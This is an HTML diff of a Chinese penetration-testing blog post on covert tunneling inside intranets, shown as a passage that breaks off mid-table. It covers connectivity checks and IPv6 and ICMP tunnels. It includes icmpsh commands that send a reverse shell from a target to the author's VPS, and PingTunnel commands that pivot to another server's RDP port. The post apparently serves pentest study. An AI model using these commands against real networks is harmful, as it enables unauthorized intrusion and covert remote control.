@@ -1,0 +1,2788 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>内网第三章-隐藏隧道通信技术 - 剑胆琴心</title><meta name="author" content="剑胆琴心">
+<meta name="author-link" content="http://geoer.cn">
+<meta name="description" content="内网第三章-隐藏隧道通信技术 内网连通性判断 常用判断方法 1.ICMP协议 1 ping &lt;IP&gt; 2.TCP协议 1 nc -zv &lt;IP&gt; &lt;port&gt; 3.HTTP协议 1 curl ip:port 4.DNS协议 1 2" /><meta name="keywords" content='渗透测试, 内网, 隧道技术, 端口转发' /><meta itemprop="name" content="内网第三章-隐藏隧道通信技术">
+<meta itemprop="description" content="内网第三章-隐藏隧道通信技术 内网连通性判断 常用判断方法 1.ICMP协议 1 ping &lt;IP&gt; 2.TCP协议 1 nc -zv &lt;IP&gt; &lt;port&gt; 3.HTTP协议 1 curl ip:port 4.DNS协议 1 2"><meta itemprop="datePublished" content="2020-05-16T21:47:03+08:00" />
+<meta itemprop="dateModified" content="2023-01-21T16:47:23+08:00" />
+<meta itemprop="wordCount" content="15298"><meta itemprop="image" content="https://geoer.cn/logo.png"/>
+<meta itemprop="keywords" content="渗透测试,内网,隧道技术,端口转发," /><meta property="og:title" content="内网第三章-隐藏隧道通信技术" />
+<meta property="og:description" content="内网第三章-隐藏隧道通信技术 内网连通性判断 常用判断方法 1.ICMP协议 1 ping &lt;IP&gt; 2.TCP协议 1 nc -zv &lt;IP&gt; &lt;port&gt; 3.HTTP协议 1 curl ip:port 4.DNS协议 1 2" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://geoer.cn/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/" /><meta property="og:image" content="https://geoer.cn/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-05-16T21:47:03+08:00" />
+<meta property="article:modified_time" content="2023-01-21T16:47:23+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://geoer.cn/logo.png"/>
+
+<meta name="twitter:title" content="内网第三章-隐藏隧道通信技术"/>
+<meta name="twitter:description" content="内网第三章-隐藏隧道通信技术 内网连通性判断 常用判断方法 1.ICMP协议 1 ping &lt;IP&gt; 2.TCP协议 1 nc -zv &lt;IP&gt; &lt;port&gt; 3.HTTP协议 1 curl ip:port 4.DNS协议 1 2"/>
+<meta name="application-name" content="剑胆琴心">
+<meta name="apple-mobile-web-app-title" content="剑胆琴心"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://geoer.cn/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/" /><link rel="prev" href="https://geoer.cn/linux%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%88%9D%E7%BA%A7/" /><link rel="next" href="https://geoer.cn/ubuntu-server-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "内网第三章-隐藏隧道通信技术",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/geoer.cn\/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF\/"
+    },"image": [{
+              "@type": "ImageObject",
+              "url": "https:\/\/geoer.cn\/images\/Apple-Devices-Preview.jpg",
+              "width":  1842 ,
+              "height":  1036 
+            }],"genre": "posts","keywords": "渗透测试, 内网, 隧道技术, 端口转发","wordcount":  15298 ,
+    "url": "https:\/\/geoer.cn\/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF\/","datePublished": "2020-05-16T21:47:03+08:00","dateModified": "2023-01-21T16:47:23+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+      "@type": "Organization",
+      "name": "剑胆琴心","logo": {
+          "@type": "ImageObject",
+          "url": "https:\/\/geoer.cn\/images\/avatar.png",
+          "width":  438 ,
+          "height":  438 
+        }},"author": {
+        "@type": "Person",
+        "name": "剑胆琴心"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tests/"
+                title="FixIt 测试"
+                
+              ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                title="友情链接"
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="/images/avatar.png"
+    title="/images/avatar.png" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tests/"
+                  title="FixIt 测试"
+                  
+                ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  title="友情链接"
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="https://github.com/shuai06"
+                  title="GitHub"
+                  rel="noopener noreferrer" target="_blank"
+                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>内网第三章-隐藏隧道通信技术</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="http://geoer.cn" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
+    class="lazyload avatar"
+    src="/svg/loading.min.svg"
+    data-src="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp"
+    data-srcset="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 1.5x, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心"/>&nbsp;剑胆琴心</a></span>
+          <span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 渗透测试</a></span></div>
+      <div class="post-meta-line"><span title=2020-05-16&#32;21:47:03><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2020-05-16">2020-05-16</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 15298 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 31 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="内网第三章-隐藏隧道通信技术">
+              <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#font-colorred内网连通性判断--font"><font color=red>内网连通性判断  </font></a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#常用判断方法">常用判断方法</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#若流量不能直接流出">若流量不能直接流出</a></li>
+    <li><a href="#font-colorred-网络层隧道技术font"><font color=red> 网络层隧道技术</font></a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#ipv6隧道">IPv6隧道</a></li>
+            <li><a href="#icmp隧道">ICMP隧道</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#工具">工具</a></li>
+                    <li><a href="#防御方法">防御方法</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#font-colorred-传输层隧道技术font"><font color=red> 传输层隧道技术</font></a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1lcx端口转发">1.lcx端口转发</a></li>
+            <li><a href="#2netcat">2.netcat</a></li>
+            <li><a href="#3powercat">3.PowerCat</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#用法">用法</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#font-colorred-应用层隧道技术font"><font color=red> 应用层隧道技术</font></a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1ssh隧道">1.SSH隧道</a></li>
+            <li><a href="#2httphttps隧道">2.HTTP/HTTPS隧道</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#regeorg-工具">reGeorg 工具</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#3dns协议重点">3.DNS协议(重点)</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#1dnscat2工具">1).dnscat2工具</a></li>
+                    <li><a href="#2iodine工具">2).iodine工具</a></li>
+                    <li><a href="#使用">使用</a></li>
+                    <li><a href="#防御dns隧道的方法">防御DNS隧道的方法</a></li>
+                    <li><a href="#各种隧道技术的优劣">各种隧道技术的优劣</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#font-colorredsocks代理-font"><font color=red>SOCKS代理 </font></a>
+      <ul>
+        <li>
+          <ul>
+            <li>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#常见socks代理工具">常见SOCKS代理工具</a></li>
+                    <li><a href="#工具使用">工具使用</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#font-colorred压缩数据-font"><font color=red>压缩数据 </font></a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1-rar">1. RAR</a></li>
+            <li><a href="#2-7-zip">2. 7-Zip</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#font-colorred-上传和下载font"><font color=red> 上传和下载</font></a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1利用ftp上传文件">1.利用FTP上传文件</a></li>
+            <li><a href="#2-利用vbs上传文件">2. 利用VBS上传文件</a></li>
+            <li><a href="#3-利用debug上传">3. 利用Debug上传</a></li>
+            <li><a href="#4-利用nishang上传">4. 利用Nishang上传</a></li>
+            <li><a href="#5-利用bitsadmin下载">5. 利用bitsadmin下载</a></li>
+            <li><a href="#6-利用powershell下载">6. 利用PowerShell下载</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h1 id="内网第三章-隐藏隧道通信技术">内网第三章-隐藏隧道通信技术</h1>
+<h2 id="font-colorred内网连通性判断--font"><font color=red>内网连通性判断  </font></h2>
+<h4 id="常用判断方法">常用判断方法</h4>
+<p><strong>1.ICMP协议</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ping &lt;IP&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.TCP协议</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -zv &lt;IP&gt; &lt;port&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>3.HTTP协议</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl ip:port
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>4.DNS协议</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 1.</span>
+</span></span><span class="line"><span class="cl">nslookup www.baidu.com vps-ip  <span class="c1"># vps-ip是dns服务器的地址</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 2.</span>
+</span></span><span class="line"><span class="cl">dig @vps-ip www.baidu.com
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="若流量不能直接流出">若流量不能直接流出</h2>
+<blockquote>
+<p>常见于企业办公网段上网的场景</p>
+</blockquote>
+<ol>
+<li>查看网络链接，判断是否存在与其他机器的8080(不绝对)等类似端口的连接(可以尝试运行<code>ping -n 1 -a &lt;ip&gt;</code>)</li>
+<li>查看内网中是否有主机名类似于<code>proxy</code>的机器</li>
+<li>查看IE浏览器的直接代理</li>
+<li>根据pac文件的路径(可能是本地路径，也可能是远程路径)，将其下载下来并查看。</li>
+<li>执行以下命令，利用curl工具进行确认</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl www.baidu.com    <span class="c1"># 不通</span>
+</span></span><span class="line"><span class="cl">curl -x proxy-ip:port  www.baidu.com    <span class="c1"># 通</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="font-colorred-网络层隧道技术font"><font color=red> 网络层隧道技术</font></h2>
+<ul>
+<li>IPv6隧道</li>
+<li>ICMP隧道</li>
+</ul>
+<h4 id="ipv6隧道">IPv6隧道</h4>
+<p>常见工具：<code>socat</code>,<code>6tunnel</code>,<code>nt6tunnel</code>等</p>
+<p>概念：通过IPv6隧道传送IPv6数据报文(把IPv6报文整体封装在IPv4数据报文中，使得IPv6报文穿过IPv4海洋，到达另一个IPv6小岛)的技术</p>
+<p>现阶段的边界设备、防火墙甚至入侵防御系统还无法识别IPv6的通信数据，而大多数的操作系统支持IPv6，所有需要手动配置(win的网络属性中)
+Note：即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包</p>
+<p><strong>配置隧道与自动隧道的区别：</strong>
+只有在执行隧道功能的节点的IPv6地址是兼容IPv4地址时，自动隧道才是可行的。在为执行隧道功能的节点分配ip地址时，如果采用的是自动隧道方法，就不需要进行设置。
+配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如：DHCP/人工配置或其他IPv4的配置机制</p>
+<p><strong>防御：</strong>
+了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信</p>
+<h4 id="icmp隧道">ICMP隧道</h4>
+<p>常见工具：<code>icmpsh</code>,<code>PingTunnel</code>,<code>icmptunnel</code>,<code>powershell icmp</code>等</p>
+<p>比较特殊的协议，<code>不用开放端口</code>，最常见的ICMP消息为ping命令的回复。
+将TCP/UDP数据包封装到ICMP的ping数据包中，从而穿过防火墙。</p>
+<h6 id="工具">工具</h6>
+<p><strong>1.icmpsh</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 不需要管理员权限</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 简单，不存在正向反向</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 下载地址: https://github.com/inquisb/icmpsh</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 本机和目标都要安装</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 安装依赖库</span>
+</span></span><span class="line"><span class="cl">apt-get install python-impacket
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">### 使用</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 我机器执行</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 先关闭本地系统的icmp应答(恢复改为0就行) -&gt; 否则会无限刷屏</span>
+</span></span><span class="line"><span class="cl">sysctl -w net.ipv4.icmp_echo_ignore_all<span class="o">=</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">./run.sh  <span class="c1"># 输入目标的公网ip  （此文件好像不对，用下面的py文件吧）</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 或者</span>
+</span></span><span class="line"><span class="cl">./icmpsh_m.py IP<span class="o">(</span>公网<span class="o">)</span> IP<span class="o">(</span>内网的公网ip<span class="o">)</span>    <span class="c1"># 这个的公网ip获取方法：ping外面，在外面抓包获取数据包的源地址 / 访问外面的地址然后查看网站访问日志等</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 目标机器执行（这里使用的win版本）</span>
+</span></span><span class="line"><span class="cl">icmp.exe -t 192.168.1.7 -d <span class="m">500</span> -b <span class="m">30</span> -s <span class="m">128</span>  <span class="c1"># 192.168.1.7我的vps</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 我的vps就会接收到反弹过来的shell</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>2.PingTunnel</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 下载地址：http://freshmeat.sourceforge.net/projects/ptunnel/</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 貌似可以这么安装：sudo apt install ptunnel</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 可跨平台使用。为了避免滥用，可为隧道设置密码</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 情景：得到的内网主机无法3389连接到数据库服务器，但是可以ping通。我们需以此机器为跳板访问另体贴数据库服务器</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 首先在两台机器都安装上此工具</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## 安装方法</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#1.安装编译</span>
+</span></span><span class="line"><span class="cl">tar -zxvf ...
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ...
+</span></span><span class="line"><span class="cl">make <span class="o">&amp;&amp;</span> make install
+</span></span><span class="line"><span class="cl"><span class="c1">#2.如果缺少pcap.h(数据包捕获函数库),就安装</span>
+</span></span><span class="line"><span class="cl">wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz
+</span></span><span class="line"><span class="cl">tar -zxvf ...
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ...
+</span></span><span class="line"><span class="cl">./configure
+</span></span><span class="line"><span class="cl"><span class="c1">#3.如果yacc包错误，安装</span>
+</span></span><span class="line"><span class="cl">sudo apt-get install -y byacc
+</span></span><span class="line"><span class="cl">sudo apt-get install flex bison
+</span></span><span class="line"><span class="cl"><span class="c1">#好了之后再安装一遍</span>
+</span></span><span class="line"><span class="cl">./configure
+</span></span><span class="line"><span class="cl">make <span class="o">&amp;&amp;</span> make install
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看帮助信息</span>
+</span></span><span class="line"><span class="cl">man pcap
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## 使用方法</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#4.运行PingTunnel(现在是linux上使用，也可在win上使用，只不过需要在内网的win服务器安装wincap类库)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 跳板机器(假设是已获取到的web服务器)：</span>
+</span></span><span class="line"><span class="cl">ptunnel -x shuteer111
+</span></span><span class="line"><span class="cl"><span class="c1"># VPS上：</span>
+</span></span><span class="line"><span class="cl">ptunnel -p &lt;跳板_IP&gt; -lp <span class="m">1080</span> -da &lt;另一新目标_IP&gt; -dp <span class="m">3389</span> -x shuteer111
+</span></span><span class="line"><span class="cl"><span class="c1"># 含义：在访问本地的1080端口时，会把数据库服务器(新目标)的3389数据封装在icmp隧道中，以web服务器为&#39;ICMP隧道跳板&#39;进行传送(窗口会显示是本地的ip，但是实际是另一台数据库服务器的)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#5.在攻击机器访问本地的1080端口，成功访问到另一台数据库服务器的3389端口</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>参数说明：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
